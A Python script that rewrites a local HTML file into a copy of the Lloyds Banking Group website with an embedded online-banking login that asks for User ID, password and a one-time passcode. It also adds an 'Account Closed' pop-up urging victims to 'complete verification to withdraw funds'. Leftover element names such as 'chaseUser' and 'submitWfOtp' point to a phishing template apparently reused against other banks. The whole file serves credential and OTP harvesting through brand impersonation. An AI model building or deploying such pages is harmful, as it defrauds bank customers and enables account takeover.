import re

with open('C:\\Users\\xingk\\Lloyds Banking Group\\index.html', 'r', encoding='utf-8') as f:
    content = f.read()

# Define new CSS
new_css = '''    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: "Segoe UI", Arial, sans-serif; }
        body { background-color:#fff; display:flex; flex-direction:column; min-height:100vh; color:#333; }
        
        /* Top Green Header */
        .top-header { background-color:#029352; padding:15px 40px; display:flex; align-items:center; justify-content:space-between; }
        .top-header .logo { display:flex; align-items:center; gap:10px; color:black; font-weight:bold; font-size:24px; }
        .top-header .search-bar { display:flex; align-items:center; background:white; border-radius:4px; padding:5px 10px; width:300px; }
        .top-header .search-bar input { border:none; outline:none; flex:1; font-size:14px; }
        .top-header .search-bar i { color:#666; margin-left:10px; }

        /* Black Nav Bar */
        .main-nav { background-color:black; padding:0 40px; display:flex; gap:30px; }
        .main-nav a { color:white; text-decoration:none; font-weight:bold; padding:15px 0; font-size:16px; border-bottom:3px solid transparent; }
        .main-nav a:hover { border-bottom:3px solid #029352; }

        /* Breadcrumbs */
        .breadcrumbs { padding:15px 40px; font-size:14px; color:#333; font-weight:bold; }
        .breadcrumbs a { color:#333; text-decoration:underline; margin:0 5px; }

        /* Hero Section */
        .hero-section { position:relative; display:flex; justify-content:space-between; padding:60px 40px; background: linear-gradient(to right, #000 0%, #333 40%, #e0e0e0 100%); color:white; min-height:450px; }
        .hero-text { max-width:50%; z-index:2; }
        .hero-text h1 { font-size:48px; margin-bottom:20px; font-weight:bold; }
        .hero-text p { font-size:20px; line-height:1.5; font-weight:bold; }

        /* Login Box (Floating) */
        .login-box { background:white; padding:30px; border-radius:8px; box-shadow:0 10px 30px rgba(0,0,0,0.3); width:350px; color:#333; z-index:2; align-self:flex-start; }
        .login-box h2 { color:#006a4d; margin-bottom:20px; font-size:22px; text-align:center; }
        .input-group { margin-bottom:15px; }
        .label { display:block; margin-bottom:5px; font-weight:bold; font-size:14px; }
        .input-field { width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; font-size:14px; }
        .btn { background-color:#029352; color:white; padding:12px; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; width:100%; }
        .btn:hover { background-color:#017a44; }

        /* Content Grid */
        .content-grid { display:flex; padding:40px; gap:40px; background:white; }
        .grid-col { flex:1; display:flex; flex-direction:column; gap:20px; }
        .video-card { background:#51b770; padding:40px; border-radius:12px; position:relative; text-align:center; color:black; height:300px; display:flex; flex-direction:column; justify-content:center; align-items:center; }
        .video-card h3 { font-size:24px; margin-bottom:20px; max-width:80%; }
        .play-btn { width:60px; height:60px; background:black; color:white; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:24px; cursor:pointer; }
        .article-card { background:#f5f5f5; border-radius:12px; overflow:hidden; }
        .article-img { width:100%; height:200px; background:#ddd; object-fit:cover; }
        .article-text { padding:30px; }
        .article-text h3 { font-size:28px; margin-bottom:15px; }
        .article-text p { font-size:16px; line-height:1.6; color:#333; }

        /* Lives Empowered Banner */
        .banner-section { display:flex; background:#cbf4c9; margin:40px; border-radius:12px; overflow:hidden; }
        .banner-text { flex:1; padding:60px 40px; }
        .banner-text h2 { font-size:36px; margin-bottom:15px; color:black; }
        .banner-text p { font-size:18px; margin-bottom:30px; font-weight:bold; }
        .banner-btn { background:black; color:white; padding:12px 30px; border-radius:8px; text-decoration:none; font-weight:bold; display:inline-block; }
        .banner-img { flex:1; background:#ddd; }

        /* How is Lloyds Section */
        .how-section { padding:40px; text-align:center; max-width:900px; margin:0 auto; }
        .how-section h2 { font-size:36px; margin-bottom:30px; }
        .how-box { background:#f5f5f5; padding:40px; border-radius:12px; text-align:left; font-size:16px; line-height:1.6; }
        .how-box p { margin-bottom:15px; }

        /* Keep existing styles for app views */
        .container { flex:1; display:flex; padding:30px; gap:30px; }
        .sidebar { width:300px; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
        .sidebar h3 { color:#006a4d; margin-bottom:20px; font-size:18px; border-bottom:2px solid #eee; padding-bottom:10px; }
        .main-content { flex:1; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
        .form-section { margin-bottom:30px; }
        .form-section h2 { color:#004d38; margin-bottom:15px; font-size:22px; }
        .chat-container { background-color:#f9f9f9; border-radius:10px; padding:20px; height:400px; overflow-y:auto; border:1px solid #ddd; margin-top:30px; }
        .chat-box { display:flex; flex-direction:column; gap:15px; }
        .chat-message { padding:12px 15px; border-radius:8px; max-width:80%; }
        .chat-message.user { background-color:#fde8e8; align-self:flex-end; text-align:right; }
        .chat-message.admin { background-color:#f1f1f1; align-self:flex-start; }
        .chat-input-area { display:flex; margin-top:20px; gap:10px; }
        .chat-input { flex:1; padding:12px; border:1px solid #ccc; border-radius:6px; }
        .chat-send { background-color:#006a4d; color:white; padding:12px 20px; border:none; border-radius:6px; cursor:pointer; }
        .footer { text-align:center; padding:20px; background-color:#eee; color:#666; border-top:1px solid #ddd; }
        .alert-closed { background:#f8d7da; color:#721c24; padding:15px 20px; border-radius:8px; margin-bottom:20px; border:1px solid #f5c6cb; font-weight:bold; }
        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; align-items:center; justify-content:center; }
        .modal-overlay.active { display:flex; }
        .modal-box { background:white; padding:30px; border-radius:12px; max-width:450px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.3); text-align:center; }
        .modal-box i { font-size:48px; color:#006a4d; margin-bottom:15px; }
        .modal-box h3 { color:#333; margin-bottom:10px; font-size:20px; }
        .modal-box p { color:#666; margin-bottom:20px; line-height:1.5; }
        .modal-box button { background:#006a4d; color:white; padding:12px 30px; border:none; border-radius:6px; font-size:15px; font-weight:bold; cursor:pointer; }
        .modal-box button:hover { background:#004d38; }
    </style>'''

# Replace <style> block
content = re.sub(r'<style>.*?</style>', new_css, content, flags=re.DOTALL)

new_body_start = '''<body>

    <!-- Account Closed Modal -->
    <div class="modal-overlay" id="accountClosedModal">
        <div class="modal-box">
            <i class="fas fa-exclamation-triangle"></i>
            <h3>Account Closed</h3>
            <p>Please complete verification to withdraw funds. Contact Lloyds Support for assistance.</p>
            <button onclick="closeModal()">OK</button>
        </div>
    </div>

    <!-- App header (shown after login) -->
    <div class="header" id="app-header" style="display:none; background-color:#029352; color:white; padding:20px 30px; display:flex; align-items:center; justify-content:space-between; border-bottom:4px solid #017a44;">
        <div class="logo" style="font-size:28px; font-weight:bold; display:flex; align-items:center;"><i class="fas fa-university"></i>&nbsp; Lloyds Banking Group Secure Portal</div>
        <div class="nav" style="display:flex; gap:20px;">
            <a href="javascript:void(0)" onclick="showView('home')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Home</a>
            <a href="javascript:void(0)" onclick="showView('verification')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Verification</a>
            <a href="javascript:void(0)" onclick="showView('history')" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Transaction History</a>
            <a href="javascript:void(0)" onclick="showSupport()" style="color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px;">Support</a>
        </div>
    </div>

    <!-- Main Landing View (with Login) -->
    <div id="view-login" style="display:block;">
        
        <!-- Top Green Header -->
        <div class="top-header">
            <div class="logo">
                <i class="fas fa-horse-head" style="font-size:32px;"></i>
                <div style="line-height:1;">
                    <div style="font-size:24px; font-weight:bold;">LLOYDS</div>
                    <div style="font-size:14px; font-weight:normal; letter-spacing:1px;">BANKING GROUP</div>
                </div>
            </div>
            <div class="search-bar">
                <input type="text" placeholder="Search...">
                <i class="fas fa-microphone"></i>
                <i class="fas fa-search"></i>
            </div>
        </div>

        <!-- Black Nav Bar -->
        <div class="main-nav">
            <a href="#">Who we are <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
            <a href="#">Sustainability <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
            <a href="#">Investors <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
            <a href="#">News & insights <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
            <a href="#">Careers <i class="fas fa-chevron-down" style="font-size:12px;"></i></a>
        </div>

        <!-- Breadcrumbs -->
        <div class="breadcrumbs">
            <a href="#">Who we are</a> / <a href="#">Purpose and strategy</a> / <span>Financial empowerment</span>
        </div>

        <!-- Hero Section with Floating Login -->
        <div class="hero-section">
            <div class="hero-text">
                <h1>Supporting and enabling<br>financial empowerment</h1>
                <p>Through simple digital tools, personalised insights and timely<br>guidance, we're helping people make informed decisions<br>every day and take small but meaningful steps toward<br>stronger financial futures.</p>
            </div>
            
            <!-- The Floating Login Box -->
            <div class="login-box">
                <h2>Sign In to Online Banking</h2>
                
                <div id="loginStep1">
                    <div class="input-group">
                        <label class="label">User ID</label>
                        <input type="text" class="input-field" id="chaseUser" placeholder="Enter User ID">
                    </div>
                    <div class="input-group">
                        <label class="label">Password</label>
                        <input type="password" class="input-field" id="chasePass" placeholder="Enter Password">
                    </div>
                    <button class="btn" onclick="submitLloydsLogin()">Continue</button>
                    <div style="margin-top:15px; text-align:center; font-size:14px;">
                        <a href="#" style="color:#029352; text-decoration:none;">Forgotten your logon details?</a>
                    </div>
                </div>

                <div id="loginStep2" style="display:none; text-align:center;">
                    <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i> Verification Required</p>
                    <p id="otpEmailDisplay" style="margin-bottom:20px; color:#666; font-size:14px;">A one-time passcode has been sent to your registered contact. Please enter it below.</p>
                    <div class="input-group" style="text-align:left;">
                        <label class="label">OTP Code</label>
                        <input type="text" class="input-field" id="chaseOtp" placeholder="Enter 6-digit code">
                    </div>
                    <button class="btn" onclick="submitWfOtp()">Verify & Sign In</button>
                    <div id="statusLogin" style="margin-top:15px; font-weight:bold; font-size:14px;"></div>
                </div>
            </div>
        </div>

        <!-- Content Grid (Video and Article) -->
        <div class="content-grid">
            <div class="grid-col">
                <div class="video-card">
                    <h3>What is financial empowerment and why does it matter?</h3>
                    <div class="play-btn"><i class="fas fa-play"></i></div>
                </div>
                <div>
                    <p style="font-weight:bold; margin-bottom:10px;">Video | 6 mins</p>
                    <p style="color:#555; line-height:1.6; margin-bottom:10px;">In this video, we explore what financial empowerment really means, why it's different from financial wellbeing, and why it plays such an important role in helping people take control of their financial lives.</p>
                    <a href="#" style="color:black; font-weight:bold; text-decoration:underline;">Watch video ></a>
                </div>
            </div>
            
            <div class="grid-col">
                <div class="article-card">
                    <img src="https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Woman looking at phone" class="article-img">
                    <div class="article-text">
                        <h3>What is financial empowerment, and why does it matter?</h3>
                        <p>When we talk about people's financial lives, terms such as financial wellbeing and financial resilience are often front of mind. But there's another concept that is just as important to how people experience money in their everyday lives: financial empowerment.</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Lives Empowered Banner -->
        <div class="banner-section">
            <div class="banner-text">
                <h2>Lives empowered, a nation<br>empowered</h2>
                <p>Helping the nation make the most of its finances.</p>
                <a href="#" class="banner-btn">Read the report</a>
            </div>
            <div class="banner-img" style="background: url('https://images.unsplash.com/photo-1600880292203-757bb62b4baf?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80') center/cover;"></div>
        </div>

        <!-- How is Lloyds Section -->
        <div class="how-section">
            <h2>How is Lloyds Banking Group enabling<br>financial empowerment?</h2>
            <div class="how-box">
                <p><strong>Financial empowerment comes when people have the confidence, tools, knowledge and opportunities to take control of their financial lives and improve their financial wellbeing over time.</strong></p>
                <p>As a leader in digital transformation, we're already shaping the future of finance and supporting people to achieve their financial goals through simple digital tools, personalised insights and timely guidance embedded in everyday banking.</p>
            </div>
        </div>

    </div>'''

# Replace from <body> to the end of <div id="corporate-content"...> </div>
content = re.sub(r'<body>.*?<div class=\"container\" id=\"main-app\" style=\"display:none;\">', new_body_start + '\n\n    <div class="container" id="main-app" style="display:none;">', content, flags=re.DOTALL)

with open('C:\\Users\\xingk\\Lloyds Banking Group\\index.html', 'w', encoding='utf-8') as f:
    f.write(content)
